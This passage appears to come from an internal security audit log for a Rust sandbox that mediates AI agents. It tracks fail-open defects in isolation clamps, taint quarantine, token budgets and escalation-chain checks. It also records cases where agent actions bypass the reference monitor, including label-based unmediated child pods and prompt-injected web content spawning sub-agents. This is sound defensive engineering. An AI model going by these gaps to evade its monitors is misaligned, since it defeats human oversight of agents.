- CLOSED (2026-09-10). `isolation_backend` is now a total function of `&DriverKind` and reads no environment at all (`std::env` no longer appears in the module); the match is exhaustive, so a new driver is a compile error before it is a mis-declared posture. `BackendCapability::{CONTAINER, LOCAL}` are declared at the floor, each dimension carrying a citation to what the container path actually sets — `HostConfig` carries only `network_mode`, `binds` and `memory`; no `pid_mode`, `readonly_rootfs`, `security_opt` or `cap_drop`.
- **A second defect was found and fixed while closing this one.** `clamp_isolation_to`'s `Unenforceable` arm was `warn!` + `return`, commented "unreachable for the built-in backends" and "fail safe: keep the requested posture". Both halves stopped being true the moment `CONTAINER`/`LOCAL` existed: the arm becomes reachable, and keeping the requested posture is precisely the outcome the function exists to prevent. It now returns `ApiError::InvalidSpec` naming the dimension, the request and the backend, and the single caller propagates it with `?`. **Adding the constants without this would have made the system worse, not better** — the clamp would have logged and waved through exactly the pods it was there to catch.
- Coverage generalised: `enforced_is_always_at_least_requested` and `enforcement_is_a_closure_operator_on_every_backend` now iterate `BackendCapability::ALL` rather than a hand-listed pair, so a backend is covered the day it is declared. The monotonicity property was restated as "never a downgrade" rather than "always succeeds", since a backend that cannot reach a request must refuse it.
- Non-vacuity: `container_and_local_admit_the_default_posture_and_refuse_what_they_cannot_back` pins both directions — the generalised property is satisfied trivially both by a backend that refuses everything and by one that accepts everything. Perturbation run and recorded: restoring `Container => FIRECRACKER` reds `the_backend_is_the_drivers_not_the_environments`; restoring the fix greens it.
- Blast radius confirmed nil for the common case: `effective_minimum_isolation()` falls back to `IsolationLattice::localhost()` (Shared/Unrestricted/Host), which both new constants admit faithfully.
- `Reflector`'s doc in `portcullis/src/closure.rs` said the `Unenforceable` case was built-in-backend-unreachable. That is no longer true, and the corrected doc names the distinction the fallback hides: returning `x` keeps the closure laws, but it is a statement about the operator, not a licence to run.

## 18) Quarantine eviction discards taint without a tombstone, and bounds nothing

Deficiency
- `FlowGraph::quarantine` caps the set at `MAX_QUARANTINED_NODES` and, on overflow, removes the **smallest** `NodeId` — the most ancestral — with no tombstone and no audit record. Ten lines below, `release_quarantine` requires a principal and a reason and appends to `quarantine_releases`. The sibling `denied` set received exactly this fix under **#480**, which tombstones the evicted node so `get()` returns `None`.
- Two compounding facts: there are **three** insertion sites (`:644`, `:1015`, `:1736`) and the cap is applied at only one, so `MAX_QUARANTINED_NODES` does not actually bound the set; and after an ancestor is evicted, *future* nodes descended from it are not marked at insert time and `is_quarantined`'s ancestry walk no longer finds it, so they escape taint. Already-materialised descendants keep their own entries.
Refs: `crates/portcullis/src/flow_graph.rs:1736-1743` (the defect), `:1019-1028` (the #480 fix on the sibling set), `:1789` (`is_quarantined`), `:216` (`MAX_QUARANTINED_NODES`)

Impact
- An adversary who can drive enough quarantine events can cause subsequent descendants of a chosen tainted node to be admitted.

TODO
- Remove the eviction: it bounds nothing while silently discarding taint. If a bound is genuinely wanted, adopt the refuse-not-evict discipline of `IdempotencyLedger` (`crates/nucleus-node/src/broker_perform.rs:311`) at all three sites — a full quarantine set stops accepting work rather than forgetting it.

DoD (guarantees)
- Quarantine past the cap; assert a later descendant of the first-quarantined node is still refused. Perturb by restoring the eviction → red.

Status
- CLOSED (2026-09-10). The eviction is removed and `MAX_QUARANTINED_NODES` deleted rather than `#[allow(dead_code)]`-ed (which would have added to the population item 29 tracks).
- **The decisive evidence was in the same file.** `maybe_compact` explicitly PRESERVES quarantined nodes — `if self.denied.contains(&id) || self.quarantined.contains(&id) { continue; }`, commented *"they carry security-critical state"*. The same set cannot be must-preserve in one place and disposable in another. That settles it without needing to argue about memory.
- The `denied` sibling can be capped **because eviction there tombstones the node** (#480), so an evicted entry becomes unreferenceable — fail-closed. Taint has no such move: it must persist in order to be inherited, so a cap on `quarantined` could only ever discard security state. The asymmetry is now written down at the constant.
- Unbounded growth is not the hazard it appeared: `next_id` is monotonic and never reset, so a stale entry can never falsely taint a new node, and a `NodeId` is 8 bytes — the old ceiling was trading a forgotten taint for 32 KB.
- Regression test `quarantine_is_not_evicted_past_the_old_ceiling` quarantines 5 001 nodes (under `MAX_GRAPH_NODES` = 10 000, so compaction is not what is being measured) and asserts both that the earliest node is still quarantined and that a descendant created afterwards still inherits it — the consequence that actually bites, since `is_quarantined` resolves descendants by walking ancestry against this set. Perturbation run and recorded: restoring the eviction reds it with "the earliest quarantined node was forgotten"; removing it again greens it.
- Note for the record: there were already ten quarantine tests in `crates/portcullis/src/flow_graph_tests.rs`. None covered the eviction, which is how it survived.

## 19) The MCP server's enforcement kernel is permissive when no policy is supplied

Deficiency
- Run without `--spec`, `nucleus-mcp` builds its kernel as `policy.clone().unwrap_or_else(PermissionLattice::permissive)`. This is not merely permissive tool *advertisement* — it is the enforcement lattice.
- `build_tool_defs` compounds it: six `unwrap_or(true)` (read / write / run / web_fetch / glob / grep) beside two `unwrap_or(false)` (web_search / manage_pods) — two contradictory absence semantics in one 30-line function — and `allow_run` folds in `git_commit`, `git_push` and `create_pr`. A test, `test_build_tool_defs_permissive`, pins the fail-open.
Refs: `crates/nucleus-mcp/src/main.rs:700` (primary), `:817-850`, `:1475` (the test that pins it)

Impact
- Absence of configuration grants shell, write and push rather than denying them.

TODO
- Refuse to start without a policy, or default to `restrictive()`. Fix both sites. Delete the test that pins the fail-open.

DoD (guarantees)
- Starting without `--spec` either refuses or yields a kernel that denies `run_bash`. Perturb by restoring `unwrap_or_else(permissive)` → red.

Status
- OPEN. Class: fail-open absence. Adjacent to item 5 (ν not applied to constructed permissions) but a distinct site.

## 20) `record_tokens` records nothing

Deficiency
- `BudgetLattice::record_tokens(&self, input, output)` is `input <= self.max_input_tokens && output <= self.max_output_tokens` — a pure ceiling comparison on an operation whose name says it consumes. Token budgets are therefore never consumed, within a session or across children.
- This is the same defect `LedgerCore` was built to close for USD, two struct fields above the budget the ledger guards. Its own non-vacuity test (`crates/portcullis/src/budget_ledger.rs:369`) mocks `delegate_to` for exactly this shape.
Refs: `crates/portcullis/src/budget.rs:191`; sole callers `crates/portcullis/tests/owasp_llm_gauntlet.rs:1436,1440,1444`

Impact
- N children of a parent with a 100k-token budget may each spend 100k.

TODO
- Split the pure lattice value from a ledger that consumes; `record_tokens` takes `&mut self`, accumulates, and refuses on exhaustion. The sole callers sit in the **required** `OWASP LLM Security Gauntlet` context and must be updated in the same commit.

DoD (guarantees)
- Two children of a 100k-token parent cannot each spend 100k.

Status
- CLOSED (2026-09-10). `record_tokens` takes `&mut self`, consumes, and refuses on exhaustion. `consumed_input_tokens` / `consumed_output_tokens` join the struct beside `consumed_usd`.
- **Adding the fields was not sufficient, and adding them naively would have opened a new hole.** `canonical_permissions_hash` already covers `consumed_usd`, with a comment explaining why: *"an unsigned `consumed_usd` would let a holder reset it to zero."* `leq` alone does not close that — the reversed-order check compares a child block against its parent, and an attacker who can edit the serialized JSON edits BOTH, so the monotone check compares tampered against tampered and passes. The new fields are therefore signature-covered too, which required bumping the domain separators: `lattice-cert-authority-v2:` → `v3`, `lattice-cert-delegation-v3:` → `v4`. Certificates are minted per pod-create and expire at `not_after`, so none outlive the deploy that carries this.
- Lattice treatment mirrors `consumed_usd` exactly, because a consumed quantity that does not participate in the order is a quantity a delegation hop can reset: `meet` takes the **max** of consumed (worst case), `join` the **min**, and `leq` compares them **reversed**.
- Atomicity across both dimensions, matching `charge`'s documented monoid-action property: if either count would exceed its limit the record is refused and **neither** is consumed. Without this, an over-large output count would drain the input allowance on its way to being refused. `checked_add`, so an attacker-supplied count near `u64::MAX` refuses rather than wrapping to a small consumed value.
- The test that pinned the defect was `token_limits_enforced` in the **required** `OWASP LLM Security Gauntlet` context. It called `record_tokens(1000, 100)` three times on a 1000/100 budget and expected the first to succeed — which it did, and so would the thousandth. Rewritten to assert consumption, plus `a_refused_token_record_consumes_nothing` (per-call limits, atomicity, overflow) and `a_child_inherits_the_parents_token_spend` (the fan-out: `meet` carries the parent's spend, and a reset-to-zero child fails `leq`). All three sit in `llm10_unbounded_consumption`, which is the correct OWASP category for this defect.
- Perturbation run and recorded: restoring the `&self` ceiling check reds all three (`token_limits_enforced`, `a_refused_token_record_consumes_nothing`, `a_child_inherits_the_parents_token_spend`); restoring the fix greens 72/72.
- No proof artifact moved: the Kani budget harnesses (`proof_budget_ledger_conserves`, `proof_budget_ledger_release_conserves`) are stated over `LedgerCore`, not `BudgetLattice`.
- Still open, and deferred to the Tier-3 ADR: `BudgetLattice::charge` keeps a second, unreconciled account of the same dollars the node's `BudgetLedger` tracks, and the eight `ck-types::BudgetBounds` fields plus `max_parallel_tasks` remain declared-affine-but-physically-linear. This item fixed the token instance, not the class — the class is `LedgerCore<Unit>`.

## 21) A distillation may raise integrity with no signature, token, or expiry

Deficiency
- `validate_distillation` raises integrity `Adversarial → Untrusted` and lowers confidentiality, gated only on token count, schema, and a regex/entropy filter. Every other declassification in the tree requires a signed, expiring, replay-bound `DeclassificationToken` (`crates/portcullis-core/src/declassify.rs`), verified against trusted governor keys and fail-closed when none are configured.
Refs: `crates/portcullis-core/src/quarantine.rs:420-478`

Impact
- An authority-raising transition with no unforgeable evidence behind it.

TODO
- ~~Require a `DeclassificationToken`; fail closed when the governor key set is unprovisioned.~~ **Superseded — see the reclassification below.**
- Delete the module in the deletion pass (PR D), and record it as a class-D row in the law-mechanism manifest.

Status
- **RECLASSIFIED (2026-09-10): not a live vulnerability, and the original TODO was wrong.** Filed as "an authority-raising transition with no unforgeable evidence", which is accurate about the code but wrong about the exposure.
- `validate_distillation` has **zero production callers**. Across every tracked file in the repo, the only mentions of `validate_distillation`, `QuarantineConfig`, `DistillResult`, `DistillError`, `SchemaSpec` and `DpiPattern` are this file's own definitions and tests — plus this entry. The whole `portcullis_core::quarantine` module is unwired.
- It is also a **weaker duplicate of a mechanism that already exists and is guarded**. `portcullis-core/src/labeled.rs` implements distillation through `DeclassifyReason::SchematicDistillation`, which refuses to promote to `Trusted` at all ("schematic distillation promotes to Untrusted, not Trusted; use HumanReview or DeterministicVerification"), pinned by `distillation_cannot_promote_to_trusted`. The `quarantine.rs` copy takes `config.output_integrity` on trust and applies it.
- So the correct disposition is **delete, not harden**. Hardening would mean adding a signed-token path to 776 lines nobody calls, and maintaining a second distillation implementation alongside the guarded one. That is how the duplicate arose.
- **Deliberately not deleted in this commit.** The plan sequences deletions into PR D precisely because deletions conflict with everything; a 776-line removal of a public module does not belong in the middle of a defect-fix stack. Tracked as a class-D row for that pass.
- Severity restated: **dead-but-dangerous**, the same category as item 22 (`SpiffeTraceChain`). Not exploitable today; a hazard the moment anyone wires it, and shaped so that wiring it looks reasonable.

## 22) `SpiffeTraceChain::verify()` performs no cryptographic check

Deficiency
- `verify()` checks lattice monotonicity and expiry only — no signature, no hash link, no parent binding. `attestation` is stored and only ever tested for non-emptiness. Its own doc says the attestation should cover `{parent_spiffe_id}|{child_spiffe_id}|{drand_round}|{permissions_hash}`; `canonical_attestation_message` instead emits `{spiffe_id}|{drand_round}|{permissions.description}` — no parent, and it signs a free-text metadata field. That function has zero callers.
- **Correction (2026-09-10).** This entry originally said the live path builds the chain *"entirely from client-supplied JSON"*. That is wrong and overstated the exposure. `deserialize_trace_chain` does not serde-deserialize a `SpiffeTraceChain`; it reconstructs one server-side through `new_root`/`SpiffeTraceLink::new`, derives each link's permissions from `preset_to_permissions(&link.preset)` (a server-side table, so a caller cannot supply a lattice), and explicitly discards the client's chain id with a `security_event = "client_id_ignored"` warning.
- What a caller *does* control is the **shape and the identities**: how many links, and what `spiffe_id` each one claims. Since nothing authenticates those strings, a caller may name any principal as an approver. That is the real defect, and it stands.
Refs: `crates/portcullis/src/escalation.rs:255-271`, `:163-171`, `:91`; `crates/nucleus-tool-proxy/src/main.rs:4320-4377`

Impact
- Worse than dead: the object is chain-shaped, so a reader assumes it is authenticated. `EscalationGrant`, the value the pipeline mints, has no consumer either — see item 29.

TODO
- [DONE] Stop the name from lying: `verify()` → `is_structurally_valid()`, with a doc that states what it does *not* check.
- [OPEN — owner decision] Either implement a real attestation scheme, or make the escalation approval path explicitly fail closed. Both are behaviour changes to a user-facing endpoint, so neither is being taken unilaterally.

DoD (guarantees)
- ~~Extend `scripts/check-failclosed-verifiers.sh`~~ — **does not fit.** That gate's subject is narrow and specific: a `#[cfg(not(target_os = "..."))]`-gated function whose name says it verifies and whose body returns success. This is a different class (a verifier that checks the *wrong thing*, on every platform), and stretching the gate to cover it would blur the rule it exists to enforce.

Status
- **PARTIAL (2026-09-10).** The misnaming is fixed; the missing cryptography is not, and is an owner decision.
- `verify()` is now `is_structurally_valid()` at all six call sites (`escalation.rs` ×4, `nucleus-tool-proxy/src/escalate.rs:116`, `exposure-playground/src/app.rs:558`), with a doc listing exactly what it does not do: no signature check, no parent binding, no authentication of the `spiffe_id` strings. Three call sites read the old name as "this delegation chain is genuine".
- `structural_validity_is_not_authentication` pins the gap as a **fact rather than prose**: a chain naming an arbitrary approver, carrying no attestation, is structurally valid. If someone later adds real signature checking, that test REDS — which is the intent, since closing the gap must also close this entry rather than silently rewording it. Non-vacuity: the same test asserts a permission-widening hop IS refused, so the structural half is real. Perturbation run: removing the monotonicity check reds it with "monotonicity IS enforced — the structural half of the check is real".
- Why the remaining half is an owner call: making `is_structurally_valid` require a verified attestation would disable the `/v1/escalate` approval path, because nothing in the tree produces one — `canonical_attestation_message` has zero callers and emits the wrong message anyway. That is defensible (the path is already inert: `EscalationGrant` is minted at `escalate.rs:177` and consumed by nobody) but it is an outward-facing behaviour change to a shipped endpoint.

## 23) Four `SinkClass` variants are structurally unreachable, and the doc says the opposite

Deficiency
- `operation_allowed_for_sink` is exhaustive per `Operation` with `matches!` arms; the union of those arms covers 15 of 19 `SinkClass` variants. `SecretRead`, `MCPWrite`, `EmailSend` and `TicketWrite` cannot be discharged for any operation, regardless of policy — yet the enterprise policy, manifest admission and the Lean flow proofs all reason about them.
- Its doc comment states it *"returns `true` (permissive) for combinations not explicitly restricted, so adding new `Operation` or `SinkClass` variants does not break existing callers"*. The code does the opposite: a new `SinkClass` silently becomes unreachable.
Refs: `crates/nucleus-ifc-kernel/src/discharge.rs:1300-1331`

TODO
- Correct the doc to match the code, and add a test that every `SinkClass` is reachable from at least one `Operation` or is listed unreachable-with-a-reason — the `documented_inventory_equals_the_enum` shape (`crates/nucleus-ifc-kernel/src/egress_channel.rs:366`).

Status
- CLOSED (2026-09-10). The doc now says what the code does, and a bidirectional gate keeps the unreachable list honest.
- The four sinks are **not** made reachable, and that is the right answer rather than the lazy one: they are unreachable because the `Operation` vocabulary has no verb for them — nothing denotes reading a secret, invoking an MCP tool, sending mail, or filing a ticket. Inventing a mapping (which `Operation` is "send email"?) would be fabricating policy to satisfy a test. Unreachable is also the **tight** direction under the standing decision: nothing can discharge to them.
- What was actually wrong was the invisibility, plus a doc asserting the opposite of the behaviour: *"returns `true` (permissive) for combinations not explicitly restricted, so adding new variants does not break existing callers by default."* The `match` is exhaustive over `Operation` and every arm is a `matches!` against a closed sink list, so an unlisted pairing has always returned `false`. Adding an `Operation` is a compile error; adding a `SinkClass` silently makes it undischargeable — and the doc promised the opposite, so nobody looked.
- `SINKS_WITH_NO_OPERATION` records the four with their reasons, and `every_sink_is_reachable_or_documented` asserts each sink is **exactly one** of reachable / documented-unreachable. Both directions matter: a new undischargeable sink fails, and a sink that becomes reachable but stays on the list also fails, so the list cannot rot into a lie either way.
- Non-vacuity: `the_documented_sinks_are_the_unreachable_ones` pins the count at 4, confirms none is admitted by any of the 13 operations, and asserts a control pairing (`GitPush`→`GitPush`) IS reachable — without which an empty `Operation::ALL` would satisfy the exclusive-or. Perturbations run: dropping `EmailSend` from the list reds with "reachable=false, documented_unreachable=false"; making it reachable via `Operation::GitPush` reds both tests; restoring greens 28/28.
- The const is `#[cfg(test)]` rather than `#[allow(dead_code)]`, so it does not add to the population item 29 tracks.
- Root cause is the Tier-3 `Effect` gap: `Operation` is a 13-verb *class* vocabulary with no target, so sinks that are targets-without-a-verb cannot be named. Recorded there, not worked around here.

## 24) `GitPush` has two different required integrity levels

Deficiency
- `SinkClass::required_integrity` says `GitPush` requires `IntegLevel::Trusted`; `sink_required_integrity` says `IntegLevel::Untrusted`. `required_authority` and `sink_required_authority` disagree the same way (`Suggestive` vs `Directive`), and `sink_max_confidentiality` / `sink_max_conf_for` cap different sink sets, neither a subset of the other.
- These are hand-maintained tables for the same 19 sink classes with no parity check. Ten further tables classify operations into exfil/private/untrusted legs and disagree four ways about whether `WriteFiles` is an exfiltration vector.
Refs: `crates/nucleus-ifc-kernel/src/ifc_ops.rs:346`, `:325`; `crates/portcullis-core/src/flow_algebra.rs:172`, `:182`, `:200`; `crates/portcullis/src/exposure_core.rs:155`

Impact
- Which table is consulted decides whether a tainted session may push. Reconciling them is a semantic decision, not a refactor: one direction loosens a live gate, the other tightens it.

TODO
- One decider. Delete one definition and have the other read from it — not a parity test between two copies.

Status
- CLOSED (2026-09-10). **Owner decision: TIGHTEN.** Where the two tables disagreed, the stricter value wins.
- The merge is not "pick the right file" — each copy was stricter on a DIFFERENT axis, so neither was authoritative. On integrity, `ifc_ops` was already ≥ `flow_algebra` on all 19 sinks; on authority, `flow_algebra` was stricter on exactly three (`GitPush`, `GitCommit`, `PRCommentWrite`: `Directive` vs `Suggestive`). The merged table is the pointwise max.
- `SinkClass::{required_integrity, required_authority, max_confidentiality}` in `crates/nucleus-ifc-kernel/src/ifc_ops.rs` is now the single decider. `flow_algebra`'s three private duplicates are **deleted, not parity-tested** — a parity test between two copies still leaves two copies. `max_confidentiality` moved to join its siblings, because the split (one crate had it, the other did not) is how they drifted in the first place.
- Behaviour change, stated plainly: `Suggestive`-authority data (an MCP tool description, say) can no longer reach a git-publish sink, and `Untrusted`-integrity data can no longer reach `GitPush` via the `flow_algebra` path. One test pinned the old looser authority value (`sink_class_authority_requirements`) and was updated to the tightened one.
- Non-vacuity on BOTH axes: `the_merged_table_refuses_what_each_old_copy_admitted` asserts that `Suggestive`+`Trusted` and `Directive`+`Untrusted` are each refused at `GitPush`, and that `Directive`+`Trusted` still passes — so the test cannot be satisfied by simply making the sink unreachable. Perturbations run and recorded: restoring the `Suggestive` floor reds it with "the authority floor did not tighten"; restoring `flow_algebra`'s `Untrusted` integrity floor reds it with "the integrity floor did not tighten"; restoring both fixes greens it.
- No proof artifact moved. `crates/nucleus-ifc-kernel/src/extracted/ifc_integrity.rs:197` pins `GitPush.required_integrity()`, and that value was already `Trusted` — the tightening touched only *authority*, which has no extracted mirror. The 70 extracted parity tests stay green.
- **PARTIALLY REVERTED (2026-09-10): the authority half was wrong.** Taking the pointwise max raised `GitCommit`/`GitPush`/`PRCommentWrite` from `Suggestive` to `Directive`. `portcullis-core`'s `flow_red_team` suite caught it: `derivation_deterministic_allowed_at_git_push` and `derivation_human_promoted_allowed_at_git_push` went from `Allow` to `Deny(AuthorityEscalation)`. Those fixtures carry `Trusted` integrity with `Suggestive` authority, which is what `Deterministic` and `HumanPromoted` data *is* — `Directive` means "can steer the agent" (a user prompt, system config), and build output is not that. The floor would have admitted nothing but user prompts to a git sink. The authority value is restored to `Suggestive`; **the merge to one decider stands.**
- What is NOT reverted, and matters: deleting `flow_algebra::sink_required_authority` removed its `_ => NoAuthority` fallthrough, which is what floored `AgentSpawn` and `CloudMutation` at `Suggestive` and closed the last two attack-corpus gaps. Verified independently — with the git trio back at `Suggestive`, `flow_red_team` is 33/33 **and** the corpus stays 13/13 enforced. The corpus win came from the deletion, not from the trio.
- Two tests written for the wrong value were corrected in the same change: `sink_class_authority_requirements` (back to "every non-read sink requires Suggestive") and the authority half of `the_merged_table_refuses_what_each_old_copy_admitted`, whose integrity half remains and is still non-vacuous.
- **The standing "tighten" rule has a limit this found.** Where two tables disagree, the stricter value is not automatically the correct one — one of them may simply be wrong, and here the stricter value came from the copy the discharge path never consulted. Tightening is the right default; it is not a substitute for asking what the value means.
- **Downstream consequence found afterwards, not predicted:** deleting `flow_algebra::sink_required_authority` removed its `_ => NoAuthority` fallthrough, which was the root cause of the last two tracked gaps in the tool-proxy attack corpus — `inject-web-spawn` (adversarial web content spawning a sub-agent) and `inject-web-cloud` (the same content mutating cloud state). Both are promoted from `known_gap` to `enforced`; the corpus is now **13/13 enforced with no known gaps**. `inject-web-spawn`'s own note had predicted the fix verbatim: *"BashExec/HTTPEgress require Suggestive; AgentSpawn should too. Fix = give action sinks an authority requirement."* This should have been caught when #24 landed — that commit ran the `portcullis`, `portcullis-core` and `nucleus-ifc-kernel` suites but not `nucleus-tool-proxy`'s, where the corpus lives.
- Still open from this item's deficiency: `exposure_core::sink_max_conf_for` is keyed on `Operation`, not `SinkClass`, so it is a different domain and is not merged here. The ten exfil-classification tables that disagree four ways about `WriteFiles` are also untouched — both belong with the closure operator in item 29's follow-on, not here.

## 25) The vestigial `DecisionToken` parameter is checked only in debug builds

Deficiency
- `Sandbox` methods take both an owned `Authority` and a `&DecisionToken`, and assert their agreement with `debug_assert_eq!`, which is absent in release.

Impact
- **LOW, and lower than it first appears.** The real gate is the `Authority`-by-value cutover, which is complete and recorded as Done: all 22 `DecisionToken`-taking `Sandbox` methods require an owned `Authority` and spend it against the operation they declare (`docs/architecture/mediated-set.md:16`, `docs/production-delta.md:48`). The `&DecisionToken` is a leftover from before that cutover. This item is cleanup, not a security hole — filed so the severity is on the record rather than inferred from the `debug_assert`.
Refs: `crates/nucleus/src/sandbox.rs:330`, `:347` and siblings

TODO
- Remove the parameter. A second, unchecked gate beside a working one is worse than none.

Status
- OPEN, low severity. **Deferred deliberately (2026-09-10), with the measurement.** 24 `Sandbox` methods take the parameter and each carries a `debug_assert_eq!`; `DecisionToken` appears ~120 times across the workspace (58 in `sandbox.rs`, 19 in `command.rs`, 15 in `portcullis/src/kernel.rs`). All three of `crates/nucleus/src/sandbox.rs` (#2754, #2752), `crates/nucleus/src/command.rs` (#2754) and `crates/nucleus-tool-proxy/src/main.rs` (four open PRs) are contended.
- A ~120-site mechanical signature change across three contended files, to remove a redundant check whose absence is not exploitable — the owned `Authority` is the gate, and that cutover is complete and recorded as Done — is the wrong trade against a serial merge queue. It lands after the contended PRs drain, not before.

## 26) Container `work_dir` is bind-mounted read-write with no validation

Deficiency
- `spawn_container_pod` bind-mounts `spec.spec.work_dir` to `/workspace:rw`, excluding only `""` and `/`. `work_dir` is a free `PathBuf` defaulting to `"."`, is not validated at admission, and is not clamped by `create_sub_pod`. `/etc`, `/root`, `/home` and any ancestor of the pod directory are all accepted.
Refs: `crates/nucleus-node/src/main.rs:1896-1899`, `crates/nucleus-spec/src/lib.rs:90`

Impact
- On the container driver, an arbitrary host directory chosen by the pod author is readable and writable from inside the sandbox.

TODO
- A newtype that refuses the root, `$HOME`, and any ancestor of the pod dir; validate at admission against the pod's `PathLattice`. Extend `scripts/check-sealed-home.sh` (existing required context) rather than adding one.

Status
- OPEN. Distinct from item 7 (string-based path sandboxing *within* `PathLattice`) and from the unicode/symlink row in `docs/production-delta.md:42`, which concern traversal inside a sandbox root rather than the choice of root.

## 27) The default container pod runs with no reference monitor

Deficiency
- `spawn_container_pod` reads `nucleus.io/proxy-mode` and treats absence as `false`, running the image entrypoint directly. In that mode the tool-proxy binary never starts, so the kernel, IFC monitor, audit trail and every startup refusal it performs are absent — while `spec.spec.credentials.env` is still injected.
- The label is read in exactly one place and **set nowhere in the repo** — no test, template or doc sets it to `"true"` — so the mediated container path has never been exercised.
- `create_sub_pod` clamps `policy`, strips `workload` and clamps `credentialed_egress`, but passes `metadata.labels` through untouched, so an agent holding `ManagePods` can set `proxy-mode`, `nucleus.io/container-image`, `nucleus.io/network: host` and `enable_pod_mgmt` on a child.
Refs: `crates/nucleus-node/src/main.rs:1805-1818`, `:1903-1907`, `:1629-1635`; `crates/nucleus-tool-proxy/src/pod_mgmt.rs:135-215`

Impact
- Two defects: an unmediated default, and an agent-reachable channel to select it for a child.

TODO
- **Do not simply flip the default** — that activates a path with no coverage. Make the weakness an explicit operator choice: refuse to launch a container pod unless the operator opts in, reusing the `check_enforcement_is_honest` refusal shape. Separately, boot-test proxy mode and flip the default once it has coverage.
- Allowlist the label keys a child may set; drop the rest, logged, as `strip_requested_workload` already does.

Status
- OPEN. Adjacent to, but not covered by, the container-driver credential exposure already recorded in `docs/production-delta.md:15`.

## 28) No production kernel knows its own isolation

Deficiency
- `Kernel::with_isolation` and `from_certificate_with_isolation` have **zero production callers** — the only two call sites are inside the `#[cfg(test)]` module of `crates/nucleus/src/command.rs`. Every production kernel is constructed via `Kernel::new` / `from_certificate`, which hardcode `IsolationLattice::localhost()`.
- Consequently the isolation-minimum gate and the defence-in-depth airgap gate have never fired in production: the first is skipped because every stock profile leaves `minimum_isolation: None`, and the second compares against `Host` forever.
Refs: `crates/portcullis/src/kernel.rs:588-590`, `:1011`, `:1135`, `:1207`; live construction sites `crates/nucleus-tool-proxy/src/main.rs:1877-1878`, `crates/nucleus-tool-proxy/src/mcp.rs:166`, `crates/nucleus-mcp/src/main.rs:701`

TODO
- Propagate `EnforcedIsolation` into the guest and construct the kernel with it; remove the implicit `localhost()` so omission is unrepresentable.
- Ship behind one release of shadow logging — two gates that have never denied anything start denying. Precedent: `gatehouse-shadow.yml`.

Status
- OPEN. Class (c).

## 29) Machine-proven mechanisms with no production call site

Deficiency
- Verified zero production call sites: `ProductLattice<A,B>`; `MeetCap`/`Attenuation` (Lean-proven, and its only lattice instance `DelegationConstraints` is documented as dead); `ConstraintNucleus`; `Kernel::with_isolation` (item 28); `PathLattice::with_work_dir`; `ProvenanceDAG`; `EscalationGrant`; `Kernel::set_policy_rules`; `TimeLattice::extend`; the whole `portcullis-profiles` crate (0 dependents); `crates/nucleus-policy` (contains only `Cargo.toml`, and is not a workspace member). `nucleus-receipt`'s `Session.parent_chain` is `vec![]` at every construction site including its own doc example.
- `dropout.rs` and `permissive.rs` are unwired **and** fail-open if wired: `PermissiveExecutor::execute` runs the closure at the ceiling and reports the gap afterwards; `project()` fills dropped dimensions with ⊤.
- Sharpest instance: `crates/portcullis/tests/{attack_landscape,owasp_llm_gauntlet,adversarial}.rs` each construct a `PathLattice::with_work_dir(...)` and prove path-traversal containment. All 11 callers are tests. The adversarial suite proves a property of a configuration production never builds.
Refs: as listed; `crates/portcullis-core/src/delegation.rs:263-266` for the self-documented dead type

Impact
- The class is already recognised here: `docs/north-star.md` demoted clause C9 because "the attested-cert producer is dead-code with its result discarded", and `scripts/check-extracted-callsites.sh` (C8) gates it for Aeneas predicates — *"a predicate proven about a function nobody calls is a proof about dead code."* What is missing is the general case.

TODO
- Case-by-case wire-or-delete, default delete. Generalise the C8 manifest to name the **law** as well as the predicate, and add a class for "declared mechanism with no live call site" on a shrink-only pin. Companion: a `#[allow(dead_code)]` ratchet — 130 occurrences over 792 tracked `.rs` files (41 `nucleus-node`, 28 `nucleus-tool-proxy`, 10 `portcullis`).
- Every such gate must derive its file domain from `git ls-files`, not a filesystem walk: the repo root contains `wt-2630/`, an untracked worktree copy with a full `crates/` tree, and a naive walk counts it. A first pass at this measurement did exactly that and over-reported by 64%.

Status
- **PARTIAL (2026-09-10): the standing gate exists.** `cargo xtask law-mechanisms` (shim `scripts/check-law-mechanisms.sh`) reads `scripts/law-mechanisms-manifest.txt` and asserts, over the production region of every file `git ls-files` reports, that each declared-dead mechanism is *still* dead: its `decl_anchor` present in the declaring file, its `use_anchor` absent everywhere else. Wired as a step in `manifest-guards.yml` (already required and unfiltered, so `ci/required-checks.txt` `PINNED=47` does not move), with a probe in `check-gates-can-fail.sh` and an entry in `scripts/prepush.sh`.
- Baseline **seeded by the gate, not carried in**: `DEAD_COUNT=7` over 659 production files — `ProductLattice`, `MeetCap`, `ConstraintNucleus`, `PathLattice::with_work_dir`, `ProvenanceDAG`, `Kernel::set_policy_rules`, `Kernel::with_isolation`. The list may only shrink, and it shrinks by wiring the mechanism or deleting it. Both are progress.
- **The gate corrected two of my own audit assumptions on its first run**, which is the argument for having built it: `ConstraintNucleus` had a production mention (the `pub use` re-export at `lib.rs:223`) so the use-anchor became the constructor form — exported is not wired; and `Kernel::with_isolation` failed the declaring-file check because a definition and its call sites never share a literal (`pub fn with_isolation` vs `Kernel::with_isolation(`). That forced a **two-anchor** format. Under the single-anchor design `PathLattice::with_work_dir` had been passing by accident, on a doc comment that happened to mention the qualified name.
- Perturbation run and recorded: appending one production line naming `ProvenanceDAG` reds the gate with "declared dead but now has 1 production call site(s)"; removing it greens.
- **Companion landed (2026-09-10): the `#[allow(dead_code)]` ratchet**, riding in the same command because it has the same subject — the manifest names mechanisms dead *on purpose*; this counts the ones dead and merely *tolerated*. The attribute is how dead code survives `-D warnings`, and nothing was counting it. `.dead-code-ratchet.toml`: `total_ceiling = 130` over 20 crates (`nucleus-node` 41, `nucleus-tool-proxy` 30, `portcullis` 10). Per-crate ceilings exist so debt cannot be laundered — moving five allowances from one crate to another leaves the total untouched, and `debt_cannot_be_laundered_between_crates` pins that a global number alone would call it clean. A crate reaching zero must drop its entry, so the list shrinks visibly instead of accumulating satisfied ceilings.
- **The seeding went wrong first, and that is the useful part.** Instructed to re-measure with the gate rather than trust the audit's hand-counted 130, the gate's first counter matched any line *containing* `#[allow(` and `dead_code` — which scored the attribute where it appears inside **string literals, including this gate's own unit-test fixtures** — and reported 135. The counter now requires the attribute to start the line, and agrees with the hand count at 130. Re-measuring was still right: it is what surfaced the false-positive class. The first number it produced simply was not, and a gate that counts its own fixtures is measuring the wrong thing.
- Two probes now, not one: a gate covering two properties needs a perturbation for each. `perturb_law_mechanism_wired` (a declared-dead mechanism gains a production call site) and `perturb_dead_code_ratchet` (one allowance past a crate's ceiling → "portcullis: 11 exceeds its ceiling 10"). Both red on their subject and green when restored.
